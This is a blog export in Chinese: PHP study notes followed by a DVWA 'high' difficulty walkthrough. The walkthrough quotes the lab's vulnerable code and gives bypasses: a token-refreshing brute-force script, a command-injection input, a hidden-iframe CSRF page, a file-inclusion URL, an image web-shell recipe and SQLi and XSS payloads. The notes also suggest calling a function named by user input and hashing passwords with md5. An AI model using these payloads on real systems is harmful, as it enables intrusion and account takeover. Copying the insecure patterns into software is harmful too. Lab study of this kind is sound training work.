执行循环体 判断表达式是否成立，不成立 do…whiledo{ 循环体 }while(表达式); 和while的区别：无论表达式是否成立，都会先执行一次循环体 循环的结束与退出continue语法： continue [n] n为整数，如果缺省为1 结束当前循环结构的本次循环，继续上n层循环结构的下一次执行。 break语法： break [n] n为整数，缺省为1 直接结束上n层循环结构。 文件包含requirerequire(文件名) require_once(文件名) require如果引用文件出现问题，会直接中断PHP程序执行。 require_once在包含时，会检查是否被包含过了，如果被包含过了就不再包含 includeinclude(文件名) include_once(文件名) include如果引用文件出现问题，虽然会报错，但仍然会执行之后的代码。 引入路径问题在实现项目中，对于HTML文件，是不允许用户直接请求，而是指向一个PHP文件，让PHP文件来引入这个HTML文件 当一个PHP文件引入一个HTML文档时，html文件本身也会引入一些其他的文件，如图片、CSS、JS 在这个时候就会发生路径更改的问题 解决办法： 使用绝对路径或者使用带域名的相对路径 魔术变量问题__DIR__ 用于获取文件所在的完整的文件名 __FILE__用于获取文件所在的路径 如果引入的文件中带有以上魔术常量，它不会随着文件引入而改变，永远为常量所在的文件的文件名与文件路径 错误处理错误的分类编译错误编译的过程中发生的错误，一般来说都是书写错误，php会告诉程序员是哪里发生错误 执行错误在编译过程通过后，在执行阶段发生的错误，会根据错误的等级，来决定是否中断程序的执行 逻辑错误因为逻辑不严谨而产生的错误 错误代码在php的错误处理机制中，每一种错误都使用了一个错误标识，这些标识是以常量的形式存在 系统错误[E_ERROR] =&gt; 1 致命错误 发生中断程序 [E_WARNING] =&gt; 2 警告错误 不会中断程序 [E_PARSE] =&gt; 4 编译错误 发生中断程序 [E_NOTICE] =&gt; 8 提示错误 不会中断程序 [E_STRICT] =&gt; 2048 [E_RECOVERABLE_ERROR] =&gt; 4096 警告错误 不会中断程序 [E_DEPRECATED] = 8192 弃用函数的错误,高版本在使用低版本已经被弃用的函数时会报错，但是仍然可用 核心错误(编译器的错误) [E_CORE_ERROR] =&gt; 16 [E_CORE_WARNING] =&gt; 32 [E_COMPILE_ERROR] =&gt; 64 [E_COMPILE_WARNING] =&gt; 128 自定义错误用户错误(可以用户自定义) [E_USER_ERROR] =&gt; 256 [E_USER_WARNING] =&gt; 512 [E_USER_NOTICE] =&gt; 1024 [E_ALL] =&gt; 6143 错误的触发系统错误的触发程序员无法干涉系统错误的触发，系统错误是由php自己检测并触发的 用户自定义错误的触发trigger_error(msg, type); msg: 错误描述信息 type：自定义错误的代码（E_USER_ERROR,E_USER_NOTICE…） 这个函数会在日志中记录这次错误信息 错误的控制设置控制错误信息是否显示php.ini中 控制错误信息是否显示 display_errors=On/Off 控制显示哪一类错误error_reporting=E_ALL error_reporting=E_NOTICE | R_WARNING error_reporting=E_ALL &amp; ~E_NOTICE 错误日志设置开启日志记录 log_errors=on 错误日志存放位置 如果没有设置error_log默认是记录到apache的错误日志中\\logs\\error.log error_log=syslog 会记录到操作系统的日志中 error_log=文件名 会记录到自定义的位置 函数函数的基本概念基本概念函数的模块化的产物，在实际开发过程中，会将项目划分为各个大的功能模块。同样将大的功能模块划分为小的功能。 函数名不区分大小写，命名规则与变量命名规则相同 函数的声明声明语法： funciton 函数名（形参列表）{ 函数体 [return值] } 调用语法： 函数名（实参列表） 可变函数与可变变量类似 function showInfo(){ echo 123; } $f = &apos;showInfo&apos;; $f(); 实际运用场景中，可以让用户来任意调用想要调用的函数 $f = $_GETp[&apos;f&apos;] $f(); f为get方式传入的函数名 函数的参数从外到内函数定义时的参数是形参 形参是被动的接受数据 形参只对内存有效，对外部不可见 函数调用时的参数是实参 主动向函数传递实际的数据 从内到外return 函数内部可以有多个return，只要遇到一个return就会终端函数执行 形参的默认值php在定义函数时，可以为形参赋值，这个值就是形参的默认值。 如果调用函数没有给具有默认值的形参传递数据，那么形参会使用默认值。 一般具有默认值的形参，一般位于形参列表的最后 匿名函数没有名字的函数即是匿名函数，有成为闭包函数 $fn = function(){ echo 123; }; $fn(); 匿名函数没有名字，并且结尾必须加入分号 PHP中的匿名函数无法自调用 但是可以赋值给一个变量，还可以作为某个函数的参数 所以我们可以将它赋值给变量，并通过变量来调用。 回调函数callback在开发过程中，我们使用别人的函数或者系统函数时，函数的参数需要你传递一个函数，作为参数传递的函数就是回调函数。 使用匿名函数作为回调函数: function showInfo($fn){ $fn(); } function say(){ echo 123; } showInfo(&apos;say&apos;); showInfo(function(){ echo 123; }); 形参和实参之间的引用传值形参和实参之间其实是一个赋值过程，那么我们也可以将这个赋值过程，变为一个引用传值过程。 function showInfo(&amp;$msg){ $msg = 200; } $msg = 100; showInfo($msg); echo $msg; 伪类型php规定了8种数据类型，在php手册中规定了另外几种类型，只会存在于手册中 mixed 表示类型不确定 callback 表示函数 scalar 如果是int float string boolean就属于这种 相关函数func_get_args() 用于获取实参，并以数组的形式返回func_get_arg(ind) 用于获取ind下标指定的实参func_num_args() 用于获取实参的个数实际运用： // 方法1 function showInfo(){ echo func_num_args(); // 获取实参的个数 echo func_get_arg(0); // 第一个实参 print_r(func_get_args()); // 所有的实参 } showInfo(1,2,3,4); // 方法2 PHP&gt;=5.6 function showInfo(...$args){ print_r($args); // 结果会以数组的形式打印出来 } showInfo(1,2,3,4); 作用域全局变量和局部变量在函数外部定义的变量，其作用域就是全局作用域，这个变量就是全局变量 在函数内部定义的变量，其作用域就是局部作用域，这个变量就是局部变量 在PHP中只有相同作用域的才能互相访问 global关键字很多时候我们需要在局部变量中使用全局变量，或者全局变量中访问内部。 通过参数的传址方式$i = 10; function showinfo(&amp;$v){ $v = $v+10; echo $v,&apos;&lt;br /&gt;&apos;; } showinfo($v); echo $v; $GLOBALS使用超全部变量实现内部访问外部 $a=&apos;a&apos;; $b=2; function showinfo(){ echo $GLOBALS[&apos;a&apos;],&apos;&lt;br /&gt;&apos;; echo $GLOBALS[&apos;b&apos;]，&apos;&lt;br /&gt;&apos;; } showinfo(); GLOBAL关键字语法： global 变量名 $i=10 function showinfo() global $i; echo $i; showinfo(); echo $i; 在函数内部建立一个与函数外部同名的变量的引用，如果外部没有这样的同名变量，会在外部创建一个同名变量 静态变量在函数内部使用static声明的变量即为静态变量 静态变量在函数被多次调用时，只会在编译阶段初始化一次，并且变量的值不会随着函数执行完毕被销毁 在函数下一次被调用时，仍然可以访问其值 在编译阶段时，如果发现函数内部有static变量，则会在数据段的静态区存储这个数据 函数执行时，会在函数空间内创建变量，并把在静态区的变量地址传给栈区中的变量 递归递归思想其实就是函数自己调用自己，一般用于解决有规律性的重复 1 2 3 5 8 13 21 34 55 89 ... function func($pos){ if($pos == 1){ return 1; }elseif($pos == 2){ return 2; }else{ return func($pos-1) + func($pos-2); } } echo func(10); 字符串常用函数trtlen语法： terlen(变量) 用于获取字符串的一个字节数(一共有几个字符) 查找strstr(str, substr); 查找str首次出现substr的位置，并截取到最后 strrchr(str, substr); 查找str最后一次出现substr的位置，并截取到最后 strpos(str, substr); 查找str首次出现substr的位置 strrpos(str, substr) 查找str最后一次出现substr的位置 分割explode(分隔符, str) 根据指定的分隔符，将字符串str进行分割，并将每一部分组织成数组，并返回 $string = &apos;a,b,c&apos;; $strArr = explode(&apos;,&apos;, $string); print_r($strArr); //Array ( [0] =&gt; a [1] =&gt; b [2] =&gt; c ) 也可以用于获取文件名 替换str_replace(replace, search, str); 在str中查找search部分，并替换成replace部分，并返回替换后的内容 $str = ‘a, b’;echo str_replace(‘b’, ‘c’ ,$str); // a, c 大小写转换strtolower(str) 转换为小写 strtoupper(str) 转换为大写 去除指定字符trim(str [,substr])将字符串两侧的子字符串去除，substr可以省略，省略为去除空格 $str = &apos;AstringA&apos;; echo trim($str, &apos;A&apos;); // string ltrim(str [,substr]) rtrim(str [,substr]) 区别于只去掉左/右 pathinfopathinfo(path [,option])获取一个文件的路径信息 path：是一个文件路径的字符串 option: 获取执行的路径信息 PATHINFO_DIRNAME PATHINFO_BASENAME md5语法： md5(str)； 说明： 用于对str字符串进行md5加密 可以在用户输入密码的时候给密码加密 htmlspecialchars()htmlspecialchars(str) htmlspecialchars_decode(str) 用于将str中的特殊符号转换为HTML字符实体。 echo htmlspecialchars(&apos;&lt;&gt;&apos;); // &amp;lt;&amp;gt;gt; 数组数组是一种数据的集合，数组主要是用于存储具有行列特征(表格)的数据。 数组的概念数组的创建索引数组的创建显示创建 $arr = array(10, 20, 30, 40); $arr2 = [10, 20, 30, 40]; 隐式创建 $arr3 = array(); $arr3[0] = 10; $arr3[1] = 20; $arr3[6] = 20; PHP中的数据下标可以不规连续 关联数组的创建显示创建 $arr = array(键名=&gt;键值, 键名=&gt;键值, ...); $arr2 = [键名=&gt;键值, 键名=&gt;键值, ...] $arr = array(&apos;key&apos;=&gt;&apos;value&apos;); $arr2 = [&apos;key&apos;=&gt;&apos;value&apos;]; 隐式创建 $arr = array(); $arr[&apos;key&apos;] = &apos;value&apos;; 多维数组PHP中支持多维数组，如果一个数组的元素又是数组，那么就是多维数组。(最多支持60维) 显示创建 $arr = array( &apos;userInfo&apos; =&gt; array(&apos;id&apos;=&gt;1, &apos;username&apos;=&gt;&apos;Json&apos;) ); $arr2 = [ &apos;userInfo&apos; =&gt; array(&apos;id&apos;=&gt;1, &apos;username&apos;=&gt;&apos;Json&apos;) ]; 隐式创建 $arr3 = array(); $arr3[&apos;userInfo&apos;] = array(&apos;id&apos;=&gt;1, &apos;username&apos;=&gt;&apos;Json&apos;); 数组元素的访问一维数组 $数组名[下标/键名] echo $arr[‘userInfo’]; 二维数组 $数组名[行下标/列下标] echo $arr[‘userInfo’][‘id’]; 数组的长度count（） 用于获取数组的长度 echo count($arr); //行数 echo count($arr[‘userInfo’]); // 具体行的列数 数组的指针表示当前所获得的点 current(arr) 获取当前指针所指向元素的键值 key(arr) 获取当前指针所指向元素的键名 next(arr) 将指针下移 prev(arr) 指针上移 reset(arr) 指针重置 end(arr) 将指针移到最后 数组的遍历for$arr = [10,20,30,40]; for($i=0;$i&lt;=count($arr);$i++){ echo $arr[$i]; } 只能作用于这种下标有规律的方式 foreachforeach($arr as [$key=&gt;]$value){ // 循环体 } 原理： 对数组的指针进行重置。 读取当前指针所指向的数组元素， 并将元素的键名赋值给$key, 键值赋值给$value， 同时数组下移一行 直接读取到数组最后(数组的最后一行其实为NULL，当foreach读到BNULL会自动止) $arr = array(&apos;one&apos;=&gt;&apos;1&apos;, &apos;two&apos;=&gt;&apos;2&apos;, &apos;three&apos;=&gt;&apos;3&apos;); foreach($arr as $key=&gt;$value){ echo $key.&apos;=&gt;&apos;.$value, &apos;&lt;br/&gt;&apos;; } 结果 one=&gt;1 two=&gt;2 three=&gt;3 数组操作常用函数数组的长度count($arr); 获取数组元素的键名与键值array_keys(); 返回所有键名 array_values(); 返回所有键值 判断键名/值是否存在array_key_exists(key, arr); 判断键名是否存在(区分大小写) in_array(value, arr); 判断键值是否存在 数组的合并array_merge($arr, $arr2); 合并两个数组 数组的排序sort(); 按键值升序 rsort(); 按键值降序 asort(); 按键值进行升序，但原下标不变 arsort(); 按键值进行降序，但原下标不变 数组解压(extract)$arr = [&apos;id&apos;=&gt;&apos;1&apos;,&apos;username&apos;=&gt;&apos;admin&apos;]; extract($arr); // 将我们关联元素转换为键名为名的变量 echo $id; echo $username;","categories":[{"name":"笔记","slug":"笔记","permalink":"https://perfect.xyz/categories/笔记/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://perfect.xyz/tags/php学习/"}]},{"title":"基于DVWA的web漏洞原理-high","slug":"dvwa-high","date":"2018-07-07T05:58:37.767Z","updated":"2018-07-13T11:17:30.717Z","comments":true,"path":"2018/07/07/dvwa-high/","link":"","permalink":"https://perfect.xyz/2018/07/07/dvwa-high/","excerpt":"有点骚♂","text":"有点骚♂ Brute Force暴力破解 核心代码： &lt;?php if( isset( $_GET[ &apos;Login&apos; ] ) ) { // 检查Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // 净化用户名输入 $user = $_GET[ &apos;username&apos; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 净化密码输入 $pass = $_GET[ &apos;password&apos; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // 连接数据库 $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // 获取用户详细信息 $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // 登录成功 echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;; } else { // 登录失败 sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } // 生成Anti-CSRF token generateSessionToken(); ?&gt; 服务器端代码加入了Token来抵御CSRF攻击以及无脑爆破，同时加入了mysqli_real_escape_string以及stripslashes函数来防止sql注入 anti-CSRF Token的原理是当用户访问时，生成一个随机的token，每当用户提交时，在服务器端比对一下token值是否正确 虽然加入了防爆破机制，但也只是防止了bp的无脑爆破，可以通过Python脚本来爆破，下面贴一个网上来找来的pyton脚本 from bs4 import BeautifulSoup import urllib2 header={ ‘Host’: ‘192.168.153.130’, ‘Cache-Control’: ‘max-age=0’, ‘If-None-Match’: “307-52156c6a290c0”, ‘If-Modified-Since’: ‘Mon, 05 Oct 2015 07:51:07 GMT’, ‘User-Agent’: ‘Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36’, ‘Accept’: ‘/‘, ‘Referer’: ‘http://192.168.153.130/dvwa/vulnerabilities/brute/index.php&#39;, ‘Accept-Encoding’: ‘gzip, deflate, sdch’, ‘Accept-Language’: ‘zh-CN,zh;q=0.8’, ‘Cookie’: ‘security=high; PHPSESSID=5re92j36t4f2k1gvnqdf958bi2’}requrl = “http://192.168.153.130/dvwa/vulnerabilities/brute/&quot; def get_token(requrl,header): req = urllib2.Request(url=requrl,headers=header) response = urllib2.urlopen(req) print response.getcode(), the_page = response.read() print len(the_page) soup = BeautifulSoup(the_page,”html.parser”) user_token = soup.form.input.input.input.input[“value”] #get the user_token return user_tokenuser_token = get_token(requrl,header) i=0 for line in open(“rkolin.txt”): requrl = “http://192.168.153.130/dvwa/vulnerabilities/brute/&quot;+&quot;?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token i = i+1 print i,’admin’,line.strip(), user_token = get_token(requrl,header) if (i == 10): break Command Injection远程命令注入 核心代码： &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $target = trim($_REQUEST[ &apos;ip&apos; ]); // 设置黑名单 $substitutions = array( &apos;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, &apos;| &apos; =&gt; &apos;&apos;, &apos;-&apos; =&gt; &apos;&apos;, &apos;$&apos; =&gt; &apos;&apos;, &apos;(&apos; =&gt; &apos;&apos;, &apos;)&apos; =&gt; &apos;&apos;, &apos;`&apos; =&gt; &apos;&apos;, &apos;||&apos; =&gt; &apos;&apos;, ); // 删除黑名单中的值 $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // 确定操作系统并执行ping命令 if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // linux $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // 反馈给用户 echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; 服务器端设置了黑名单，将非法的字符删除为空字符 看似过滤了所有的非法字符，但是实际上是把’| ‘替换为空字符，而服务器执行命令时是自上而下执行的，所以把管道符改为||时，比如127.0.0.1 || net user，服务器从上往下，删除掉一个’| ‘后，原来的命令就变为127.0.0.1 | net user，结果还是一样的 当然直接用127.0.0.1|net user，也可以绕过 CSRF跨站点请求伪造 核心代码： &lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // 检查Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // 获取输入的值 $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // 检测密码是否匹配 if( $pass_new == $pass_conf ) { // 匹配成功 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } // 生成Anti-CSRF token generateSessionToken(); ?&gt; 由于加入了Anti-CSRF token机制，所以当我们要攻击时，就必须先获取token 构造html页面： &lt;script type=&quot;text/javascript&quot;&gt; function attack() { document.getElementsByName(&apos;user_token&apos;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&apos;user_token&apos;)[0].value; document.getElementById(&quot;transfer&quot;).submit(); } &lt;/script&gt; &lt;iframe src=&quot;http://localhost:8888/dvwa/vulnerabilities/csrf&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt; &lt;/iframe&gt; &lt;body onload=&quot;attack()&quot;&gt; &lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://localhost:8888/dvwa/vulnerabilities/csrf&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt; &lt;/form&gt; &lt;/body&gt; 当受害者访问这个页面时，脚本会在后台访问修改密码的页面，获取页面中的token，并向服务器发送修改密码的请求 File Inclusion文件包含 核心代码： &lt;?php // 显示的页面参数 $file = $_GET[ &apos;page&apos; ]; // 输入检查 if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) { // 当输入的参数有误时 echo &quot;ERROR: File not found!&quot;; exit; } ?&gt; fnmatch() 函数根据指定的模式来匹配文件名或字符串。 服务器端加入了检测机制，输入的page参数必须带有file才能包含 我们可以利用file协议绕过，当浏览器访问一个本地的文件时，封装的协议就是file://构造url：http://localhost:8888/dvwa/vulnerabilities/fi/?page=file:///D:\\phpStudy\\WWW\\phpinfo.phppage后面跟的参数为想要访问的文件的绝对路径 File Upload文件上传 核心代码： &lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // 文件上传路径 $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // 文件信息 $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; $uploaded_tmp = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ]; // 检查是否为img if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // 文件夹是否能移动到新位置 if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { // 不能 echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // 可以 echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // 图片不是Img时 echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; } } ?&gt; getimagesize() 函数用于获取图像大小及相关信息 每种格式的图片都会有各种的特征，getimagesize函数就是用于检查上传的图片是否有规定的特征 然而上传的jpg和png文件不像gif那样，直接在最前面添加一个gif89a就能绕过，所以我们需要制作一个图片木马 制作方法： cmd输入:copy 图片.jpg/b+木马.php/a 图片木马.jpg 将图片.jpg和木马.php合并并保存为图片木马.jpg 上传到服务器之后用菜刀之类的工具连接 Insecure CAPTCHA不安全的验证码 核心代码： &lt;?php if( isset( $_POST[ &apos;Change&apos; ] ) ) { // 隐藏CAPTCHA窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // 从第三方获取验证码 $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos; ], $_POST[&apos;g-recaptcha-response&apos;] ); if ( $resp || ( $_POST[ &apos;g-recaptcha-response&apos; ] == &apos;hidd3n_valu3&apos; &amp;&amp; $_SERVER[ &apos;HTTP_USER_AGENT&apos; ] == &apos;reCAPTCHA&apos; ) ){ // 验证成功，检查两次输入的密码是否一致 if ($pass_new == $pass_conf) { $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } else { // 验证码验证失败 $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } // 生成Anti-CSRF token generateSessionToken(); ?&gt; 验证的逻辑就是当参数recaptcha_response_field不等于hidd3n_valu3或者http包头的User-Agent参数不等于reCAPTCHA时，认为输入错误 直接用bp抓包，将User-Agent值改为于reCAPTCHA，并在参数栏里加一个recaptcha_response_field=hidd3n_valu3即可 SQL Injectionsql注入 核心代码： &lt;?php if( isset( $_SESSION [ &apos;id&apos; ] ) ) { // 获取输入的值 $id = $_SESSION[ &apos;id&apos; ]; // 连接数据库，并将查询的结果放入结果集中 $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&apos; ); // 获取结果集 while( $row = mysqli_fetch_assoc( $result ) ) { // 获取值 $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // 反馈给用户 echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 服务器在查询数据时加入了LIMIT 1，只输出一条结果 由于没有过滤注释符，所以只要在参数后面加一个#就可以绕过，或者是将or前面的值改为0，即查不到这个id，那服务器就会把or后面的值作为输出 high级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。 SQL Injection (Blind)sql盲注 核心代码： &lt;?php if( isset( $_COOKIE[ &apos;id&apos; ] ) ) { // 获取输入的值 $id = $_COOKIE[ &apos;id&apos; ]; // 连接数据库，并将查询的结果放入结果集中 $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // 获取结果集 $num = @mysqli_num_rows( $result ); if( $num &gt; 0 ) { // 反馈给用户 echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;; } else { // 打乱Sleep函数的沉睡时间 if( rand( 0, 5 ) == 3 ) { sleep( rand( 2, 4 ) ); } // 没有找到用户，返回错误 header( $_SERVER[ &apos;SERVER_PROTOCOL&apos; ] . &apos; 404 Not Found&apos; ); // 反馈给用户 echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 可以看到，服务器利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep，其结果是扰乱了时间盲注 既然时间盲注用不了，那就用布尔盲注就好 Weak Session IDs弱Session的id 核心代码： &lt;?php $html = &quot;&quot;; if ($_SERVER[&apos;REQUEST_METHOD&apos;] == &quot;POST&quot;) { if (!isset ($_SESSION[&apos;last_session_id_high&apos;])) { $_SESSION[&apos;last_session_id_high&apos;] = 0; } $_SESSION[&apos;last_session_id_high&apos;]++; $cookie_value = md5($_SESSION[&apos;last_session_id_high&apos;]); setcookie(&quot;dvwaSession&quot;, $cookie_value, time()+3600, &quot;/vulnerabilities/weak_id/&quot;, $_SERVER[&apos;HTTP_HOST&apos;], false, false); } ?&gt; 这里将cookie的值进行了md5打散，并且还设置了期限之类进一步增加SessionID的安全性，但不足的是进行md5散列的值是0的累加，只要收集大量的SessionID，把SessionID拿去md5解密之后就能找到其规律 之后的步骤同Low XSS (DOM)核心代码： &lt;?php // 检查是否输入了值 if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) { # 设置白名单 switch ($_GET[&apos;default&apos;]) { case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit; } } ?&gt; 虽然设置了白名单，但是没有过滤注释符，跟medium一样，加入#就行http://localhost:8888/dvwa/vulnerabilities/xss_d/?default=English#default==English%20%3Cscript%3Ealert(/xss/)%3C/script%3E XSS (Reflected)反射型xss 核心代码： &lt;?php header (&quot;X-XSS-Protection: 0&quot;); // 检查是否输入了值 if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // 获取输入的值 $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] ); // 反馈给用户 echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } ?&gt; preg_replace函数执行一个正则表达式的搜索和替换 